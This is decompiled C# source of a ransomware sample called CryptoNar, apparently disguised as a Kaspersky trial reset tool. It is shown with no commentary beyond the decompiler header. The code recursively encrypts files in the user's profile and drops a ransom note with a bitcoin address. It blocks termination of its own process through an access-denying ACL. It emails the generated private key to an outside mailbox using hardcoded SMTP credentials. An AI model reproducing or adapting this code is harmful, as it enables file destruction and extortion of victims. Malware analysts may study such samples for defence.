// Decompiled with JetBrains decompiler
// Type: CryptoNar.Program
// Assembly: kasperskytrialreset, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 35F54376-B284-4294-89A4-F0FFEE9E54ED
// Assembly location: C:\Users\Administrateur\Downloads\toto\Trojan-Ransom.MSIL.Agent.gog-69ba1e841933539403aedc15b34736c76a0dd6cb4874d262f29bce1fa3493d1c.exe

using CryptoNar.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace CryptoNar
{
  internal class Program
  {
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetKernelObjectSecurity(
      IntPtr Handle,
      int securityInformation,
      [Out] byte[] pSecurityDescriptor,
      uint nLength,
      out uint lpnLengthNeeded);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool SetKernelObjectSecurity(
      IntPtr Handle,
      int securityInformation,
      [In] byte[] pSecurityDescriptor);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    private static void Main(string[] args)
    {
      if (!Program.NarIsNotRunning())
        return;
      Program.SetAclDenyAll();
      if (System.IO.File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "jokingwithyou.cryptoNar")))
        return;
      Program.RunInfector();
    }

    private static void RunInfector()
    {
      try
      {
        string path1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "jokingwithyou.cryptoNar");
        string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
        string path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "encKey.cryptoNar");
        string str = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "CryptoNarDecryptor.exe");
        string publicKey = string.Empty;
        string publicAndPrivateKey = string.Empty;
        List<string> files = Program.GetFiles(environmentVariable, "*.*");
        CryptoClass cryptoClass = new CryptoClass();
        foreach (string fileName in files)
        {
          FileInfo fileInfo = new FileInfo(fileName);
          if (fileInfo.Extension == ".txt" || fileInfo.Extension == ".md")
          {
            try
            {
              cryptoClass.EncryptFileFully(fileInfo.FullName);
              System.IO.File.Move(fileInfo.FullName, Path.Combine(fileInfo.DirectoryName, fileInfo.Name + ".fully.cryptoNar"));
            }
            catch (Exception ex)
            {
            }
          }
          else
          {
            try
            {
              cryptoClass.EncryptFilePartially(fileInfo.FullName);
              System.IO.File.Move(fileInfo.FullName, Path.Combine(fileInfo.DirectoryName, fileInfo.Name + ".partially.cryptoNar"));
            }
            catch (Exception ex)
            {
            }
          }
        }
        cryptoClass.GenerateKeys(1024, out publicKey, out publicAndPrivateKey);
        byte[] bytes = Program.GetBytes(cryptoClass.EncryptionKey);
        byte[] inArray = cryptoClass.RsaEncryption(bytes, 1024, publicKey);
        System.IO.File.WriteAllText(path2, Convert.ToBase64String(inArray));
        using (StreamWriter streamWriter = new StreamWriter(path1, true))
          streamWriter.WriteLine("Do not delete this file, else the decryption process will be broken");
        string contents = Resources.CryptoNarMessage.Replace("[HWID goes here]", Program.GetHwid()).Replace("[bitcoin address]", "1FeutvrVeiF8Qdnnx9Rr3CyBfHBCFeKWPq");
        System.IO.File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "CRYPTONAR RECOVERY INFORMATION.txt"), contents, Encoding.Unicode);
        Program.SendEmail(publicAndPrivateKey);
        if (!System.IO.File.Exists(str))
          System.IO.File.WriteAllBytes(str, Resources.CryptoNar);
        Process.Start(str);
      }
      catch (Exception ex)
      {
      }
    }

    private static void SendEmail(string publicPrivateKey)
    {
      string str = "Hello: " + Program.GetHwid() + " How are you: " + Convert.ToBase64String(Program.GetBytes(publicPrivateKey));
      MailMessage message = new MailMessage();
      message.From = new MailAddress("johnstang@zoho.eu");
      message.To.Add(new MailAddress("johnsmith987654@tutanota.com"));
      message.Subject = "Hello";
      message.Body = str;
      new SmtpClient()
      {
        Host = "smtp.zoho.eu",
        Port = 587,
        EnableSsl = true,
        UseDefaultCredentials = false,
        Credentials = ((ICredentialsByHost) new NetworkCredential("johnstang@zoho.eu", "johnnyssmith123"))
      }.Send(message);
    }

    private static List<string> GetFiles(string path, string pattern)
    {
      List<string> files = new List<string>();
      try
      {
        files.AddRange((IEnumerable<string>) Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
        foreach (string directory in Directory.GetDirectories(path))
          files.AddRange((IEnumerable<string>) Program.GetFiles(directory, pattern));
      }
      catch (Exception ex)
      {
      }
      return files;
    }

    private static void SetAclDenyAll()
    {
      IntPtr currentProcess = Program.GetCurrentProcess();
      RawSecurityDescriptor securityDescriptor = Program.GetProcessSecurityDescriptor(currentProcess);
      securityDescriptor.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
      Program.SetProcessSecurityDescriptor(currentProcess, securityDescriptor);
    }

    private static RawSecurityDescriptor GetProcessSecurityDescriptor(
      IntPtr processHandle)
    {
      byte[] pSecurityDescriptor = new byte[0];
      uint lpnLengthNeeded;
      Program.GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor, 0U, out lpnLengthNeeded);
      if (lpnLengthNeeded < 0U || lpnLengthNeeded > (uint) short.MaxValue)
        throw new Win32Exception();
      byte[] binaryForm;
      if (!Program.GetKernelObjectSecurity(processHandle, 4, binaryForm = new byte[(int) lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded))
        throw new Win32Exception();
      return new RawSecurityDescriptor(binaryForm, 0);
    }

    private static void SetProcessSecurityDescriptor(
      IntPtr processHandle,
      RawSecurityDescriptor dacl)
    {
      byte[] numArray = new byte[dacl.BinaryLength];
      dacl.GetBinaryForm(numArray, 0);
      if (!Program.SetKernelObjectSecurity(processHandle, 4, numArray))
        throw new Win32Exception();
    }

    private static string GetHwid() => new UHWIDEngine().SimpleUID;

    private static bool NarIsNotRunning()
    {
      bool createdNew;
      Mutex mutex = new Mutex(true, "CryptNarWalker90912", out createdNew);
      if (!createdNew)
        return false;
      GC.KeepAlive((object) mutex);
      return true;
    }

    private static byte[] GetBytes(string str)
    {
      byte[] dst = new byte[str.Length * 2];
      Buffer.BlockCopy((Array) str.ToCharArray(), 0, (Array) dst, 0, dst.Length);
      return dst;
    }

    [System.Flags]
    private enum ProcessAccessRights
    {
      PROCESS_CREATE_PROCESS = 128, // 0x00000080
      PROCESS_CREATE_THREAD = 2,
      PROCESS_DUP_HANDLE = 64, // 0x00000040
      PROCESS_QUERY_INFORMATION = 1024, // 0x00000400
      PROCESS_QUERY_LIMITED_INFORMATION = 4096, // 0x00001000
      PROCESS_SET_INFORMATION = 512, // 0x00000200
      PROCESS_SET_QUOTA = 256, // 0x00000100
      PROCESS_SUSPEND_RESUME = 2048, // 0x00000800
      PROCESS_TERMINATE = 1,
      PROCESS_VM_OPERATION = 8,
      PROCESS_VM_READ = 16, // 0x00000010
      PROCESS_VM_WRITE = 32, // 0x00000020
      DELETE = 65536, // 0x00010000
      READ_CONTROL = 131072, // 0x00020000
      SYNCHRONIZE = 1048576, // 0x00100000
      WRITE_DAC = 262144, // 0x00040000
      WRITE_OWNER = 524288, // 0x00080000
      STANDARD_RIGHTS_REQUIRED = WRITE_OWNER | WRITE_DAC | READ_CONTROL | DELETE, // 0x000F0000
      PROCESS_ALL_ACCESS = 2035711, // 0x001F0FFF
    }
  }
}
